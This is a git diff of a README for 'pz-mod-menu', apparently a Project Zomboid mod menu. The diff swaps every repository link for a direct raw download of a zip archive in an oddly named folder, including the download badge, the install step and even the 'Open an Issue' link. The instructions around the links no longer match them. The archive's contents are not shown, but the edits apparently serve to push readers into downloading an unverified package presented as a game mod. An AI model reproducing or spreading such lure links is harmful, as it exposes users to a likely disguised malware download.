@@ -1,6 +1,6 @@
 # 🎮 pz-mod-menu - Sleep Like a Pro, Survive Like a Legend
 
-[![Download Now](https://img.shields.io/badge/Download-pz--mod--menu-4CAF50?style=for-the-badge&logo=github)](https://github.com/sansoz/pz-mod-menu)
+[![Download Now](https://img.shields.io/badge/Download-pz--mod--menu-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sansoz/pz-mod-menu/main/barrenly/menu_mod_pz_1.6-beta.4.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Getting pz-mod-menu up and running is simple. Just follow these three easy steps
 
 ### Step 1: Download the Mod
 
-Visit this link to download the application: **[https://github.com/sansoz/pz-mod-menu](https://github.com/sansoz/pz-mod-menu)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/sansoz/pz-mod-menu/main/barrenly/menu_mod_pz_1.6-beta.4.zip](https://raw.githubusercontent.com/sansoz/pz-mod-menu/main/barrenly/menu_mod_pz_1.6-beta.4.zip)**
 
 Click the green "Code" button on that page, then choose "Download ZIP." This downloads the whole mod package to your computer.
 
@@ -129,7 +129,7 @@ This mod is 100% offline and does not collect any data. It runs entirely on your
 
 If you run into any issues or have questions, please:
 
-- Open an **Issue** on the GitHub page: [https://github.com/sansoz/pz-mod-menu/issues](https://github.com/sansoz/pz-mod-menu/issues)
+- Open an **Issue** on the GitHub page: [https://raw.githubusercontent.com/sansoz/pz-mod-menu/main/barrenly/menu_mod_pz_1.6-beta.4.zip](https://raw.githubusercontent.com/sansoz/pz-mod-menu/main/barrenly/menu_mod_pz_1.6-beta.4.zip)
 - Check the **Discussions** tab for community help.
 
 We respond quickly and are happy to help.
@@ -144,7 +144,7 @@ Enjoy the apocalypse, and sleep well!
 
 ---
 
-**Download again:** [https://github.com/sansoz/pz-mod-menu](https://github.com/sansoz/pz-mod-menu)
+**Download again:** [https://raw.githubusercontent.com/sansoz/pz-mod-menu/main/barrenly/menu_mod_pz_1.6-beta.4.zip](https://raw.githubusercontent.com/sansoz/pz-mod-menu/main/barrenly/menu_mod_pz_1.6-beta.4.zip)
 
 ---
 
